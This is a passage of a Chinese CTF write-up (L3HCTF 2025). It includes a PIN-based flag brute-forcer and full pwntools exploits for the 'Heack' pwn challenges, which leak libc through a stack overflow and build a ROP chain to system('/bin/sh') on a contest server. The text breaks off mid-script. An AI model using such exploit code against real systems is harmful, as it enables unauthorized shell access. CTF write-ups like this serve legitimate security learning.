class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 配置 ---</span></span><br><span class="line">PIN_COMMAND = [<span class="string">&quot;./pin&quot;</span>, <span class="string">&quot;-t&quot;</span>, <span class="string">&quot;inscount0.so&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;./AWayOut2&quot;</span>]</span><br><span class="line"><span class="comment"># 字符集顺序现在变得更重要。将常见字符放在前面可能会提高效率。</span></span><br><span class="line">CHARSET = <span class="string">&quot;jkhl&#123;&quot;</span></span><br><span class="line">FLAG_LENGTH = <span class="number">118</span></span><br><span class="line">MAX_THREADS = <span class="number">16</span></span><br><span class="line"><span class="comment"># --- 辅助函数 (与之前相同) ---</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_instruction_count</span>(<span class="params">test_flag</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    运行 PIN 工具并获取给定 flag 的指令数。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(PIN_COMMAND)</span><br><span class="line">        p.recvline(timeout=<span class="number">200</span>)</span><br><span class="line">        p.sendline(test_flag.encode())</span><br><span class="line">        output = p.recvall(timeout=<span class="number">200</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        </span><br><span class="line">        lines = output.strip().splitlines()</span><br><span class="line">        <span class="keyword">if</span> lines <span class="keyword">and</span> lines[-<span class="number">1</span>].isdigit():</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(lines[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 新的主逻辑 (激进 DFS) ---</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_aggressive_dfs</span>(<span class="params">known_prefix=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用激进的深度优先搜索策略。</span></span><br><span class="line"><span class="string">    一旦发现一个字符比当前层级已知的最小指令数显著更低，就立即深入。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 基本情况：如果长度达到目标，说明成功了</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(known_prefix) == FLAG_LENGTH:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 成功！找到完整 Flag: <span class="subst">&#123;known_prefix&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    current_pos = <span class="built_in">len</span>(known_prefix)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 正在爆破第 <span class="subst">&#123;current_pos + <span class="number">1</span>&#125;</span> 位字符 (前缀: &#x27;<span class="subst">&#123;known_prefix&#125;</span>&#x27;)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 获取基准字符 &#x27;&#123;&#x27; 的指令数 (此步骤仍然串行)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;    -&gt; 获取基准指令数 (字符: &#x27;&#123;&#123;&#x27;)...&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    ref_flag = known_prefix + <span class="string">&quot;&#123;&quot;</span></span><br><span class="line">    ref_count = get_instruction_count(ref_flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot; 指令数: <span class="subst">&#123;ref_count&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 准备所有要并行测试的任务</span></span><br><span class="line">    <span class="keyword">if</span> known_prefix:</span><br><span class="line">        <span class="keyword">if</span> known_prefix[-<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">            chars_to_test = [<span class="string">&quot;l&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;k&quot;</span>]</span><br><span class="line">        <span class="keyword">elif</span> known_prefix[-<span class="number">1</span>] == <span class="string">&quot;h&quot;</span>:</span><br><span class="line">            chars_to_test = [<span class="string">&quot;h&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;k&quot;</span>]</span><br><span class="line">        <span class="keyword">elif</span> known_prefix[-<span class="number">1</span>] == <span class="string">&quot;j&quot;</span>:</span><br><span class="line">            chars_to_test = [<span class="string">&quot;l&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;h&quot;</span>]</span><br><span class="line">        <span class="keyword">elif</span> known_prefix[-<span class="number">1</span>] == <span class="string">&quot;k&quot;</span>:</span><br><span class="line">            chars_to_test = [<span class="string">&quot;l&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;k&quot;</span>]</span><br><span class="line">    <span class="keyword">else</span>:   </span><br><span class="line">        chars_to_test = [<span class="string">&quot;h&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;k&quot;</span>]</span><br><span class="line">    flags_to_test = [known_prefix + char <span class="keyword">for</span> char <span class="keyword">in</span> chars_to_test]</span><br><span class="line">    </span><br><span class="line">    candidates = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 使用线程池并行爆破所有字符</span></span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=MAX_THREADS) <span class="keyword">as</span> executor:</span><br><span class="line">        <span class="comment"># executor.map 会将 get_instruction_count 函数应用到 flags_to_test 中的每一项</span></span><br><span class="line">        <span class="comment"># 它会按顺序返回结果，这非常方便</span></span><br><span class="line">        all_counts = executor.<span class="built_in">map</span>(get_instruction_count, flags_to_test)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4. 收集并处理结果</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;    -&gt; 所有并行任务已完成，正在分析结果...&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> char, count <span class="keyword">in</span> <span class="built_in">zip</span>(chars_to_test, all_counts):</span><br><span class="line">            <span class="keyword">if</span> count != -<span class="number">1</span>:</span><br><span class="line">                diff = <span class="built_in">abs</span>(ref_count - count)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;known_prefix+char&#125;</span> (指令数: <span class="subst">&#123;count&#125;</span>, 差值: <span class="subst">&#123;diff&#125;</span>)&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> diff &lt; <span class="number">1000</span>:</span><br><span class="line">                    candidates.append((char, count))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对所有候选路径并行发起 DFS 递归</span></span><br><span class="line">    <span class="keyword">if</span> candidates:</span><br><span class="line">        <span class="keyword">with</span> ThreadPoolExecutor(max_workers=MAX_THREADS) <span class="keyword">as</span> executor:</span><br><span class="line">            <span class="comment"># 提交所有递归任务</span></span><br><span class="line">            futures = [executor.submit(solve_aggressive_dfs, known_prefix + char) <span class="keyword">for</span> char, _ <span class="keyword">in</span> candidates]</span><br><span class="line">            <span class="comment"># 等待第一个成功返回的结果</span></span><br><span class="line">            <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(futures):</span><br><span class="line">                <span class="keyword">if</span> future.result(): <span class="comment"># 如果某个子任务返回 True</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span> <span class="comment"># 立刻将成功信号向上传递</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果遍历完所有字符都没有找到一条成功的路径，则说明当前前缀是错误的</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[-] 在位置 <span class="subst">&#123;current_pos + <span class="number">1</span>&#125;</span> 处所有尝试均失败。回溯...&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 程序入口 ---</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始使用“激进”DFS 策略进行全长度 Flag 爆破&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> solve_aggressive_dfs(<span class="string">&quot;lljjljjhhjjjjjllkkkllljjlljjjhhhhhhjjjjjlljjhhhjjjjlllkklllllkkkllkkkklkllllljjjlllllklllllljjjhhhjjjl&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 未能找到完整的 Flag。&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br></pre></td></tr></table></figure>

<p>跑到最后基本就看出来路径没问题了</p>
<p><img src="../images/2025-L3HCTF/d177101f-3d17-4d53-9632-214263c460a8.png" alt="img"></p>
<p>正确路径为lljjljjhhjjjjjllkkkllljjlljjjhhhhhhjjjjjlljjhhhjjjjlllkklllllkkkllkkkklkllllljjjlllllklllllljjjhhhjjjljjllljjhhjjljjlj</p>
<p>md5后即为flag</p>
<h1><span id="pwn">Pwn</span><a href="#pwn" class="header-anchor"></a></h1><h2><span id="heack">Heack</span><a href="#heack" class="header-anchor"></a></h2><p>漏洞在 fight_dragon 有个明显的stack溢出，可以通过修改 v3 来如果 canary,然后修改返回地址</p>
<p><img src="../images/2025-L3HCTF/07e49080-a9a6-4610-a379-67b43ef2f18b.png" alt="img"></p>
<p>fight_dragon  返回时 rsi 是一个libc 地址 ，1&#x2F;16 概率 把返回地址改到这里，可以直接泄露 libc,</p>
<p><img src="../images/2025-L3HCTF/07094fcd-700d-482b-88f7-0fe500c2f99f.png" alt="img"></p>
<p><img src="../images/2025-L3HCTF/aa76fbd0-1b5c-466b-a845-c38381792c2d.png" alt="img"></p>
<p>有了libc 后  再次利用 fight_dragon  栈溢出 写 rop 即可</p>
<p><img src="../images/2025-L3HCTF/bb76d5e7-ac4a-4333-9688-3c1494ba32ee.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import CDLL</span></span><br><span class="line"><span class="comment">#cdl = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">s    = <span class="keyword">lambda</span>   x : io.send(x)</span><br><span class="line">sa   = <span class="keyword">lambda</span> x,y : io.sendafter(x,y)</span><br><span class="line">sl   = <span class="keyword">lambda</span>   x : io.sendline(x)</span><br><span class="line">sla  = <span class="keyword">lambda</span> x,y : io.sendlineafter(x,y)</span><br><span class="line">r    = <span class="keyword">lambda</span> x   : io.recv(x)</span><br><span class="line">ru   = <span class="keyword">lambda</span> x   : io.recvuntil(x)</span><br><span class="line">rl   = <span class="keyword">lambda</span>     : io.recvline()</span><br><span class="line">itr  = <span class="keyword">lambda</span>     : io.interactive()</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ls   = <span class="keyword">lambda</span> x   : log.success(x)</span><br><span class="line">lss  = <span class="keyword">lambda</span> x   : ls(<span class="string">&#x27;\033[1;31;40m%s -&gt; 0x%x \033[0m&#x27;</span> % (x, <span class="built_in">eval</span>(x)))</span><br><span class="line"></span><br><span class="line">attack = <span class="string">&#x27;43.138.2.216:9999&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">binary = <span class="string">&#x27;./vul2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:<span class="keyword">return</span> gdb.debug(binary,gdbscript)</span><br><span class="line">    <span class="keyword">if</span> args.TAG:<span class="keyword">return</span> remote(*args.TAG.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> args.REM:<span class="keyword">return</span> remote(*attack.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> process([binary] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span></span><br><span class="line">context(binary = binary, log_level = <span class="string">&#x27;debug&#x27;</span>,</span><br><span class="line">terminal=<span class="string">&#x27;tmux splitw -h -l 170&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line">libc = context.binary.libc</span><br><span class="line"><span class="comment">#elf  = ELF(binary)</span></span><br><span class="line"><span class="comment">#print(context.binary.libs)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#import socks</span></span><br><span class="line"><span class="comment">#context.proxy = (socks.SOCKS5, &#x27;192.168.31.251&#x27;, 10808)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">brva 0x00146F</span></span><br><span class="line"><span class="string">brva 0x01817</span></span><br><span class="line"><span class="string">#continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"><span class="comment">#import os</span></span><br><span class="line"><span class="comment">#os.systimport os</span></span><br><span class="line"><span class="comment">#io = remote(*attack.split(&#x27;:&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">note_system</span>():</span><br><span class="line">    ru(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,text</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Choose an option: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size))</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    s(text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rm</span>(<span class="params">idx</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Choose an option: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Choose an option: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;---\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    io = start([])</span><br><span class="line">    ru(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;shout:&#x27;</span>)</span><br><span class="line">    pay = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x103</span></span><br><span class="line">    pay += p8(<span class="number">0x17</span>)</span><br><span class="line">    pay += p16(<span class="number">0xc91A</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sl(pay)</span><br><span class="line">        ru(<span class="string">&#x27;[Attack]: &#x27;</span>)</span><br><span class="line">        libc_base = <span class="built_in">int</span>(rl()) - <span class="number">0x204643</span></span><br><span class="line">        libc.address = libc_base</span><br><span class="line">        lss(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">        system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">        poprdi = <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>)))</span><br><span class="line">        rop  = p64(poprdi+<span class="number">1</span>)</span><br><span class="line">        rop += p64(poprdi)</span><br><span class="line">        rop += p64(bin_sh)</span><br><span class="line">        rop += p64(system)</span><br><span class="line">        ru(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ru(<span class="string">&#x27;shout:&#x27;</span>)</span><br><span class="line">        pay = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x103</span></span><br><span class="line">        pay += p8(<span class="number">0x17</span>)</span><br><span class="line">        pay += rop</span><br><span class="line">        <span class="comment">#gdb.attach(io,gdbscript)</span></span><br><span class="line">        sl(pay)</span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2><span id="heack-revenge">Heack_revenge</span><a href="#heack-revenge" class="header-anchor"></a></h2><p>fight_dragon 被修复了，但没完全修复，仍然存在 溢出，只不过只能修改返回地址的一个字节</p>
<p><img src="../images/2025-L3HCTF/31bdd8d6-7c8a-4c5a-9356-0beeedc18a8c.png" alt="img"></p>
<p>写个脚本把在 0x18xx 这段里的gadget 都找出来看看，有没有可以利用的 </p>
<p><img src="../images/2025-L3HCTF/693c8005-17a5-433c-b432-28caf1e7c6f5.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;FF488D05880C00004889C7E8F0F8FFFF8B45F4488B55F864482B1425280000007405E8E9F8FFFFC9C3F30F1EFA554889E54881ECB000000064488B042528000000488945F831C0488D8550FFFFFFBAA8000000BE000000004889C7E8D0F8FFFFC745E8050F2A01C745EC5D0F1F008B55E88B45EC31D08945F08B45F089C6488D053D0C00004889C7B800000000E88EF8FFFF488D05370C00004889C7E85FF8FFFFB800000000E8DF010000B800000000E8CB0200008945F48B45F483F8050F875001000089C0488D148500000000488D051B0D00008B04024898488D150F0D00004801D03EFFE0488B45D84889C7E829FEFFFFBF00000000E893F8FFFF488D05210C0000&#x27;</span></span><br><span class="line">data = <span class="built_in">bytes</span>.fromhex(data)</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    tmp = data[i:i+<span class="number">0x10</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(disasm(tmp))</span><br></pre></td></tr></table></figure>

<p> 有个 pop rbp</p>
<p><img src="../images/2025-L3HCTF/d77fb7fe-c1e2-4de5-808c-5fe34a69a30a.png" alt="img"></p>
<p>恰好下面就是 heap地址，后继续运行程序并没有出错</p>
<p><img src="../images/2025-L3HCTF/0d441f67-7f39-4616-8f27-a5d96d9713d0.png" alt="img"></p>
<p>后面执行 note_system 可以看到  note_list[] 也在堆上了</p>
<p><img src="../images/2025-L3HCTF/9bc8087e-e4a6-4361-a60e-0b15de4b2c6c.png" alt="img"></p>
<p> 需要在heap 上提前布局，然后泄露 heap 地址， game 函数 return 时 rsp 也在 heap 上（后面再堆风水，修改stack 进行rop）</p>
<p><img src="../images/2025-L3HCTF/55d7f1b7-5096-42cb-ba13-a1ad0fd127ef.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import CDLL</span></span><br><span class="line"><span class="comment">#cdl = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">s    = <span class="keyword">lambda</span>   x : io.send(x)</span><br><span class="line">sa   = <span class="keyword">lambda</span> x,y : io.sendafter(x,y)</span><br><span class="line">sl   = <span class="keyword">lambda</span>   x : io.sendline(x)</span><br><span class="line">sla  = <span class="keyword">lambda</span> x,y : io.sendlineafter(x,y)</span><br><span class="line">r    = <span class="keyword">lambda</span> x   : io.recv(x)</span><br><span class="line">ru   = <span class="keyword">lambda</span> x   : io.recvuntil(x)</span><br><span class="line">rl   = <span class="keyword">lambda</span>     : io.recvline()</span><br><span class="line">itr  = <span class="keyword">lambda</span>     : io.interactive()</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ls   = <span class="keyword">lambda</span> x   : log.success(x)</span><br><span class="line">lss  = <span class="keyword">lambda</span> x   : ls(<span class="string">&#x27;\033[1;31;40m%s -&gt; 0x%x \033[0m&#x27;</span> % (x, <span class="built_in">eval</span>(x)))</span><br><span class="line"></span><br><span class="line">attack = <span class="string">&#x27;43.138.2.216:19999&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">binary = <span class="string">&#x27;./vul2_revenge&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:<span class="keyword">return</span> gdb.debug(binary,gdbscript)</span><br><span class="line">    <span class="keyword">if</span> args.TAG:<span 